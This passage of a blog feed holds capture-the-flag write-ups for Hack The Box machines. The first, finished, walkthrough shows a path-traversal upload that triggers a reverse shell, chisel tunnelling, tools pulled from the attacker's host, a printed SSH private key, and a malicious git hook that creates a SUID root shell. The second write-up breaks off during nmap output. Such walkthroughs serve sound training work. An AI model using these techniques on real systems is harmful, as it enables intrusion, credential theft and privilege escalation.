</span></span><span style="display:flex;"><span>    malView <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malFile <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;file&#34;</span>: (<span style="color:#e6db74">&#34;..//app/app/views.py&#34;</span>, malView)}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#34;http://opensource.htb/upcloud&#34;</span>, files<span style="color:#f92672">=</span>malFile)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(res)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;http://opensource.htb/revShell/</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(ip, port))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(res)
</span></span></code></pre></div></li>
</ul>
<h2 id="discovering-the-application-on-port-3000">Discovering the Application on port 3000</h2>
<p>It looks like we are root inside a docker container. I can also see a request comming from the main host to this machine every few minutes <em>172.17.0.1 - - [05/Oct/2022 15:02:02] &ldquo;GET / HTTP/1.1&rdquo; 200 -</em>.</p>
<p>The first thing I&rsquo;ll do is to check the port <em>3000</em> that was previously marked as <em>filtered</em> by nmap to see if I can get anything.</p>
<p>Using <em>netcat</em>, I&rsquo;ll check to see if this is a webserver (usually webservers runs on port 3000).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>/app <span style="color:#75715e"># nc 172.17.0.1 3000</span>
</span></span><span style="display:flex;"><span>HEAD / HTTP/1.1
</span></span><span style="display:flex;"><span>Host: 172.17.0.1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">200</span> OK
</span></span><span style="display:flex;"><span>Set-Cookie: i_like_gitea<span style="color:#f92672">=</span>a0f2435183e3d93a; Path<span style="color:#f92672">=</span>/; HttpOnly; SameSite<span style="color:#f92672">=</span>Lax
</span></span><span style="display:flex;"><span>Date: Wed, <span style="color:#ae81ff">05</span> Oct <span style="color:#ae81ff">2022</span> 15:11:22 GMT
</span></span></code></pre></div><p>I got a response, and by reading the session cookie I can tell that this application is 

<a href="https://gitea.io/en-us/" target="_blank"><em>Gitea</em></a>.</p>
<h3 id="getting-user-on-the-host-machine">Getting User On the Host Machine</h3>
<p>I&rsquo;ll upload 

<a href="https://github.com/jpillora/chisel/releases" target="_blank"><em>chisel</em></a> to the victim machine and <em>port forward</em> the port <em>3000</em> to my local attacking machine.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 -m http.server
</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
</span></span><span style="display:flex;"><span>10.10.11.164 - - <span style="color:#f92672">[</span>06/Oct/2022 06:31:47<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /chisel_1.7.7_linux_amd64 HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>/app <span style="color:#75715e"># wget http://10.10.16.59:8000/chisel_1.7.7_linux_amd64</span>
</span></span><span style="display:flex;"><span>Connecting to 10.10.16.59:8000 <span style="color:#f92672">(</span>10.10.16.59:8000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>saving to <span style="color:#e6db74">&#39;chisel_1.7.7_linux_amd64&#39;</span>
</span></span><span style="display:flex;"><span>chisel_1.7.7_linux_a 100% |********************************| 7888k  0:00:00 ETA
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;chisel_1.7.7_linux_amd64&#39;</span> saved
</span></span></code></pre></div><p>On my attacking machine, I&rsquo;ll run a server instance of 

<a href="https://github.com/jpillora/chisel/releases" target="_blank"><em>chisel</em></a> that will listen on port 9001, then I&rsquo;ll connect to it from the victim machine and forward the connection of <em>http://172.17.0.1:3000/</em> accessible only from this machine to mine.</p>
<ul>
<li>On the attacker:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ /opt/chisel/chisel_1.7.7_linux_amd64 server -p <span style="color:#ae81ff">9001</span> --reverse
</span></span><span style="display:flex;"><span>2022/10/06 06:44:50 server: Reverse tunnelling enabled
</span></span><span style="display:flex;"><span>2022/10/06 06:44:50 server: Fingerprint kLnVUdsvKZMD+fJ8bH+jt0Hizup2oUVE54EiS6kzxzs<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>2022/10/06 06:44:50 server: Listening on http://0.0.0.0:9001
</span></span></code></pre></div></li>
<li>On the victim:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>/app <span style="color:#75715e"># ./chisel_1.7.7_linux_amd64 client 10.10.16.59:9001 R:127.0.0.1:3000:172.17.0.1:3000</span>
</span></span><span style="display:flex;"><span>2022/10/06 03:51:01 client: Connecting to ws://10.10.16.59:9001
</span></span><span style="display:flex;"><span>2022/10/06 03:51:02 client: Connected <span style="color:#f92672">(</span>Latency 81.014967ms<span style="color:#f92672">)</span>
</span></span></code></pre></div></li>
</ul>
<p>I can now access 

<a href="https://gitea.io/en-us/" target="_blank"><em>Gitea</em></a> from my attacking machine using firefox on <em>http://127.0.0.1:3000/</em></p>
<p><img src="accessing-gitea.png" alt="Accessing Gitea From My Machine"></p>
<p>Now I&rsquo;ll use the previous credentials <em>dev01:Soulless_Developer#2022</em> to try to login to this instance.</p>
<p><img src="discovering-home-dir-backup.png" alt="Loging In To Gitea"></p>
<p>It appears that this user is trying to backup his home directory, so I can take advantage of this and read his <em>.ssh/id_rsa</em> key file.</p>
<p><img src="reading-ssh-key.png" alt="Reading SSH Key"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ chmod <span style="color:#ae81ff">600</span> dev01_id_rsa 
</span></span><span style="display:flex;"><span>$ cat dev01_id_rsa 
</span></span><span style="display:flex;"><span>-----BEGIN RSA PRIVATE KEY-----
</span></span><span style="display:flex;"><span>MIIJKQIBAAKCAgEAqdAaA6cYgiwKTg/6SENSbTBgvQWS6UKZdjrTGzmGSGZKoZ0l
</span></span><span style="display:flex;"><span>xfb28RAiN7+yfT43HdnsDNJPyo3U1YRqnC83JUJcZ9eImcdtX4fFIEfZ8OUouu6R
</span></span><span style="display:flex;"><span>u2TPqjGvyVZDj3OLRMmNTR/OUmzQjpNIGyrIjDdvm1/Hkky/CfyXUucFnshJr/BL
</span></span><span style="display:flex;"><span>7FU4L6ihII7zNEjaM1/d7xJ/0M88NhS1X4szT6txiB6oBMQGGolDlDJXqA0BN6cF
</span></span><span style="display:flex;"><span>wEza2LLTiogLkCpST2orKIMGZvr4VS/xw6v5CDlyNaMGpvlo+88ZdvNiKLnkYrkE
</span></span><span style="display:flex;"><span>WM+N+2c1V1fbWxBp2ImEhAvvgANx6AsNZxZFuupHW953npuL47RSn5RTsFXOaKiU
</span></span><span style="display:flex;"><span>rzJZvoIc7h/9Jh0Er8QLcWvMRV+5hjQLZXTcey2dn7S0OQnO2n3vb5FWtJeWVVaN
</span></span><span style="display:flex;"><span>O/cZWqNApc2n65HSdX+JY+wznGU6oh9iUpcXplRWNH321s9WKVII2Ne2xHEmE/ok
</span></span><span style="display:flex;"><span>Nk+ZgGMFvD09RIB62t5YWF+yitMDx2E+XSg7bob3EO61zOlvjtY2cgvO6kmn1E5a
</span></span><span style="display:flex;"><span>FX5S6sjxxncq4cj1NpWQRjxzu63SlP5i+3N3QPAH2UsVTVcbsWqr9jbl/5h4enkN
</span></span><span style="display:flex;"><span>W0xav8MWtbCnAsmhuBzsLML0+ootNpbagxSmIiPPV1p/oHLRsRnJ4jaqoBECAwEA
</span></span><span style="display:flex;"><span>AQKCAgEAkXmFz7tGc73m1hk6AM4rvv7C4Sv1P3+emHqsf5Y4Q63eIbXOtllsE/gO
</span></span><span style="display:flex;"><span>WFQRRNoXvasDXbiOQqhevMxDyKlqRLElGJC8pYEDYeOeLJlhS84Fpp7amf8zKEqI
</span></span><span style="display:flex;"><span>naMZHbuOg89nDbtBtbsisAHcs+ljBTw4kJLtFZhJ0PRjbtIbLnvHJMJnSH95Mtrz
</span></span><span style="display:flex;"><span>rkDIePIwe/KU3kqq1Oe0XWBAQSmvO4FUMZiRuAN2dyVAj6TRE1aQxGyBsMwmb55D
</span></span><span style="display:flex;"><span>O1pxDYA0I3SApKQax/4Y4GHCbC7XmQQdo3WWLVVdattwpUa7wMf/r9NwteSZbdZt
</span></span><span style="display:flex;"><span>C/ZoJQtaofatX7IZ60EIRBGz2axq7t+IEDwSAQp3MyvNVK4h83GifVb/C9+G3XbM
</span></span><span style="display:flex;"><span>BmUKlFq/g20D225vnORXXsPVdKzbijSkvupLZpsHyygFIj8mdg2Lj4UZFDtqvNSr
</span></span><span style="display:flex;"><span>ajlFENjzJ2mXKvRXvpcJ6jDKK+ne8AwvbLHGgB0lZ8WrkpvKU6C/ird2jEUzUYX7
</span></span><span style="display:flex;"><span>rw/JH7EjyjUF/bBlw1pkJxB1HkmzzhgmwIAMvnX16FGfl7b3maZcvwrfahbK++Dd
</span></span><span style="display:flex;"><span>bD64rF+ct0knQQw6eeXwDbKSRuBPa5YHPHfLiaRknU2g++mhukE4fqcdisb2OY6s
</span></span><span style="display:flex;"><span>futu9PMHBpyHWOzO4rJ3qX5mpexlbUgqeQHvsrAJRISAXi0md0ECggEBAOG4pqAP
</span></span><span style="display:flex;"><span>IbL0RgydFHwzj1aJ/+L3Von1jKipr6Qlj/umynfUSIymHhhikac7awCqbibOkT4h
</span></span><span style="display:flex;"><span>XJkJGiwjAe4AI6/LUOLLUICZ+B6vo+UHP4ZrNjEK3BgP0JC4DJ5X/S2JUfxSyOK+
</span></span><span style="display:flex;"><span>Hh/CwZ9/6/8PtLhe7J+s7RYuketMQDl3MOp+MUdf+CyizXgYxdDqBOo67t4DxNqs
</span></span><span style="display:flex;"><span>ttnakRXotUkFAnWWpCKD+RjkBkROEssQlzrMquA2XmBAlvis+yHfXaFj3j0coKAa
</span></span><span style="display:flex;"><span>Ent6NIs/B8a/VRMiYK5dCgIDVI9p+Q7EmBL3HPJ+29A6Eg3OG50FwfPfcvxtxjYw
</span></span><span style="display:flex;"><span>Fq338ppt+Co0wd8CggEBAMCXiWD6jrnKVJz7gVbDip64aa1WRlo+auk8+mlhSHtN
</span></span><span style="display:flex;"><span>j+IISKtyRF6qeZHBDoGLm5SQzzcg5p/7WFvwISlRN3GrzlD92LFgj2NVjdDGRVUk
</span></span><span style="display:flex;"><span>kIVKRh3P9Q4tzewxFoGnmYcSaJwVHFN7KVfWEvfkM1iucUxOj1qKkD1yLyP7jhqa
</span></span><span style="display:flex;"><span>jxEYrr4+j1HWWmb7Mvep3X+1ZES1jyd9zJ4yji9+wkQGOGFkfzjoRyws3vPLmEmv
</span></span><span style="display:flex;"><span>VeniuSclLlX3xL9CWfXeOEl8UWd2FHvZN8YeK06s4tQwPM/iy0BE4sDQyae7BO6R
</span></span><span style="display:flex;"><span>idvvvD8UInqlc+F2n1X7UFKuYizOiDz0D2pAsJI9PA8CggEBAI/jNoyXuMKsBq9p
</span></span><span style="display:flex;"><span>vrJB5+ChjbXwN4EwP18Q9D8uFq+zriNe9nR6PHsM8o5pSReejSM90MaLW8zOSZnT
</span></span><span style="display:flex;"><span>IxrFifo5IDHCq2mfPNTK4C5SRYN5eo0ewBiylCB8wsZ5jpHllJbFavtneCqE6wqy
</span></span><span style="display:flex;"><span>8AyixXA2Sp6rDGN0gl49OD+ppEwG74DxQ3GowlQJbqhzVXi+4qAyRN2k9dbABnax
</span></span><span style="display:flex;"><span>5kZK5DtzMOQzvqnISdpm7oH17IF2EINnBRhUdCjHlDsOeVA1KmlIg3grxpZh23bc
</span></span><span style="display:flex;"><span>Uie2thPBeWINOyD3YIMfab2pQsvsLM7EYXlGW1XjiiS5k97TFSinDZBjbUGu6j7Z
</span></span><span style="display:flex;"><span>VTYKdX8CggEAUsAJsBiYQK314ymRbjVAl2gHSAoc2mOdTi/8LFE3cntmCimjB79m
</span></span><span style="display:flex;"><span>LwKyj3TTBch1hcUes8I4NZ8qXP51USprVzUJxfT8KWKi2XyGHaFDYwz957d9Hwwe
</span></span><span style="display:flex;"><span>cAQwSX7h+72GkunO9tl/PUNbBTmfFtH/WehCGBZdM/r7dNtd8+j/KuEj/aWMV4PL
</span></span><span style="display:flex;"><span>0s72Mu9V++IJoPjQZ1FXfBFqXMK+Ixwk3lOJ4BbtLwdmpU12Umw1N9vVX1QiV/Z6
</span></span><span style="display:flex;"><span>zUdTSxZ4TtM3fiOjWn/61ygC9eY6l2hjYeaECpKY4Dl48H4FV0NdICB6inycdsHw
</span></span><span style="display:flex;"><span>+p+ihcqRNcFwxsXUuwnWsdHv2aiH9Z3H8wKCAQAlbliq7YW45VyYjg5LENGmJ8f0
</span></span><span style="display:flex;"><span>gEUu7u8Im+rY+yfW6LqItUgCs1zIaKvXkRhOd7suREmKX1/HH3GztAbmYsURwIf/
</span></span><span style="display:flex;"><span>nf4P67EmSRl46EK6ynZ8oHW5bIUVoiVV9SPOZv+hxwZ5LQNK3o7tuRyA6EYgEQll
</span></span><span style="display:flex;"><span>o5tZ7zb7XTokw+6uF+mQriJqJYjhfJ2oXLjpufS+id3uYsLKnAXX06y4lWqaz72M
</span></span><span style="display:flex;"><span>NfYDE7uwRhS1PwQyrMbaurAoI1Dq5n5nl6opIVdc7VlFPfoSjzixpWiVLZFoEbFB
</span></span><span style="display:flex;"><span>AE77E1AeujKjRkXLQUO3z0E9fnrOl5dXeh2aJp1f+1Wq2Klti3LTLFkKY4og
</span></span><span style="display:flex;"><span>-----END RSA PRIVATE KEY-----
</span></span></code></pre></div><p>Using SSH I can login the machine and get the user flag.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ssh -i dev01_id_rsa dev01@opensource.htb
</span></span><span style="display:flex;"><span>Welcome to Ubuntu 18.04.5 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15.0-176-generic x86_64<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  System information as of Thu Oct  <span style="color:#ae81ff">6</span> 05:38:28 UTC <span style="color:#ae81ff">2022</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  System load:  0.01              Processes:              <span style="color:#ae81ff">215</span>
</span></span><span style="display:flex;"><span>  Usage of /:   75.6% of 3.48GB   Users logged in:        <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  Memory usage: 22%               IP address <span style="color:#66d9ef">for</span> eth0:    10.10.11.164
</span></span><span style="display:flex;"><span>  Swap usage:   0%                IP address <span style="color:#66d9ef">for</span> docker0: 172.17.0.1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">16</span> updates can be applied immediately.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">9</span> of these updates are standard security updates.
</span></span><span style="display:flex;"><span>To see these additional updates run: apt list --upgradable
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Last login: Mon May <span style="color:#ae81ff">16</span> 13:13:33 <span style="color:#ae81ff">2022</span> from 10.10.14.23
</span></span><span style="display:flex;"><span>dev01@opensource:~$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dev01<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dev01<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dev01<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>dev01@opensource:~$ cat user.txt 
</span></span><span style="display:flex;"><span>6c4**************************c7c
</span></span><span style="display:flex;"><span>dev01@opensource:~$ 
</span></span></code></pre></div><h2 id="post-enumeration">Post Enumeration</h2>
<p>I&rsquo;ll use 

<a href="https://github.com/DominicBreuker/pspy#download" target="_blank"><em>pspy</em></a> to snoop on running processes and see if I can get anything about root.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dev01@opensource:/tmp$ wget http://10.10.16.59:8000/pspy64 
</span></span><span style="display:flex;"><span>--2022-10-06 07:52:21--  http://10.10.16.59:8000/pspy64
</span></span><span style="display:flex;"><span>Connecting to 10.10.16.59:8000... connected.
</span></span><span style="display:flex;"><span>HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
</span></span><span style="display:flex;"><span>Length: <span style="color:#ae81ff">3078592</span> <span style="color:#f92672">(</span>2.9M<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>application/octet-stream<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Saving to: ‘pspy64’
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pspy64                                               100%<span style="color:#f92672">[======================================================================================================================</span>&gt;<span style="color:#f92672">]</span>   2.94M   117KB/s    in 39s     
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>2022-10-06 07:53:02 <span style="color:#f92672">(</span>76.5 KB/s<span style="color:#f92672">)</span> - ‘pspy64’ saved <span style="color:#f92672">[</span>3078592/3078592<span style="color:#f92672">]</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dev01@opensource:/tmp$ chmod +x pspy64
</span></span><span style="display:flex;"><span>dev01@opensource:/tmp$ ./pspy64
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>2022/10/06 07:56:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">16029</span>  | /bin/bash /usr/local/bin/git-sync 
</span></span><span style="display:flex;"><span>2022/10/06 07:56:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">16030</span>  | /bin/bash /root/meta/app/clean.sh 
</span></span><span style="display:flex;"><span>2022/10/06 07:56:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">16031</span>  | /bin/bash /root/meta/app/clean.sh 
</span></span><span style="display:flex;"><span>2022/10/06 07:56:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">16034</span>  | /bin/bash /root/meta/app/clean.sh 
</span></span><span style="display:flex;"><span>2022/10/06 07:56:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">16033</span>  | /bin/bash /root/meta/app/clean.sh 
</span></span><span style="display:flex;"><span>2022/10/06 07:56:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">16032</span>  | /bin/bash /usr/local/bin/git-sync 
</span></span><span style="display:flex;"><span>2022/10/06 07:56:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">16035</span>  | git add . 
</span></span><span style="display:flex;"><span>2022/10/06 07:56:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">16037</span>  | git push origin main 
</span></span><span style="display:flex;"><span>2022/10/06 07:56:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">16038</span>  | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git 
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>It appears that root is executing <em>/usr/local/bin/git-sync</em> which is a script that contains <em>git</em> commands.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dev01@opensource:/tmp$ cat /usr/local/bin/git-sync
</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cd /home/dev01/
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ! git status --porcelain; <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;No changes&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    day<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>date +<span style="color:#e6db74">&#39;%Y-%m-%d&#39;</span><span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;Changes detected, pushing..&#34;</span>
</span></span><span style="display:flex;"><span>    git add .
</span></span><span style="display:flex;"><span>    git commit -m <span style="color:#e6db74">&#34;Backup for </span><span style="color:#e6db74">${</span>day<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    git push origin main
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
</span></span></code></pre></div><h3 id="getting-root">Getting root</h3>
<p>The overall idea to escalate privileges is about root <em>commiting changes</em> after navigating to the <em>/home/dev01</em> directory. So I can <em>add a hook</em> in the <em>.git/hooks/</em> directory which is a script that will get executed by any user running a specific git command.</p>
<p>There are many types of hooks, for example a <em>pre-commit</em> hook will run before the user commits a change. On the other hand, a <em>post-commit</em> hook will run after the commit takes place, and there are others depending on the actions taken like push etc&hellip;</p>
<p>So, I&rsquo;ll add a new file in <em>.git/hooks/</em> called <em>pre-commit</em> that contains a reverse shell and make it executable and this will run whenever any user makes a commit in this repo/directory. And since root is making commits when any change is made to the directory, I&rsquo;ll also create a new file.</p>
<p>To get root:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>touch ~/dummyfile
</span></span><span style="display:flex;"><span>touch ~/.git/hooks/pre-commit;
</span></span><span style="display:flex;"><span>chmod +x ~/.git/hooks/pre-commit;
</span></span><span style="display:flex;"><span>echo -e <span style="color:#e6db74">&#39;#!/bin/bash\ncp /bin/bash /tmp/newbash;\nchmod u+s /tmp/newbash&#39;</span> &gt; ~/.git/hooks/pre-commit
</span></span></code></pre></div><p>After waiting some time, a new <em>SUID</em> bash file has been created in <em>/tmp</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dev01@opensource:~$ ls -l /tmp/newbash 
</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1113504</span> Oct  <span style="color:#ae81ff">6</span> 09:30 /tmp/newbash
</span></span><span style="display:flex;"><span>dev01@opensource:~$ /tmp/newbash -p
</span></span><span style="display:flex;"><span>newbash-4.4# id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dev01<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dev01<span style="color:#f92672">)</span> euid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dev01<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>newbash-4.4# cat /root/root.txt
</span></span><span style="display:flex;"><span>288**************************093
</span></span></code></pre></div>]]></content>
        </item>
        
        <item>
            <title>Scrambled Write-Up</title>
            <link>https://mostxeon.github.io/posts/scrambled/</link>
            <pubDate>Tue, 27 Sep 2022 22:16:35 +0300</pubDate>
            
            <guid>https://mostxeon.github.io/posts/scrambled/</guid>
            <description>false</description>
            <content type="html"><![CDATA[<h2 id="initial-recon">Initial Recon</h2>
<h3 id="nmap">Nmap</h3>
<p>Starting with a full tcp port scan we got the below results</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -vvv -p- -A -oN nmap/tcp-all.txt 10.10.11.168
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.168
</span></span><span style="display:flex;"><span>Host is up, received syn-ack <span style="color:#f92672">(</span>0.084s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Scanned at 2022-09-20 03:50:10 EEST <span style="color:#66d9ef">for</span> 512s
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65513</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       REASON  VERSION
</span></span><span style="display:flex;"><span>53/tcp    open  domain        syn-ack Simple DNS Plus
</span></span><span style="display:flex;"><span>80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
</span></span><span style="display:flex;"><span>|_http-title: Scramble Corp Intranet
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|   Supported Methods: OPTIONS TRACE GET HEAD POST
</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2022-09-20 01:05:04Z<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span>389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: scrm.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_ssl-date: 2022-09-20T01:08:14+00:00; +9m34s from scanner time.
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC1.scrm.local
</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:DC1.scrm.local
</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>scrm-DC1-CA/domainComponent<span style="color:#f92672">=</span>scrm
</span></span><span style="display:flex;"><span>| Public Key type: rsa
</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex;"><span>| Signature Algorithm: sha1WithRSAEncryption
</span></span><span style="display:flex;"><span>| Not valid before: 2022-06-09T15:30:57
</span></span><span style="display:flex;"><span>| Not valid after:  2023-06-09T15:30:57
</span></span><span style="display:flex;"><span>| MD5:   679c fca8 69ad 25c0 86d2 e8bb <span style="color:#ae81ff">1792</span> d7c3
</span></span><span style="display:flex;"><span>| SHA-1: bda1 1c23 bafc 973e 60b0 d87c c893 d298 e2d5 <span style="color:#ae81ff">4233</span>
</span></span><span style="display:flex;"><span>| -----BEGIN CERTIFICATE-----
</span></span><span style="display:flex;"><span>| MIIGHDCCBQSgAwIBAgITEgAAAAL3nCxaHxOhQAAAAAAAAjANBgkqhkiG9w0BAQUF
</span></span><span style="display:flex;"><span>| ADBDMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFDASBgoJkiaJk/IsZAEZFgRzY3Jt
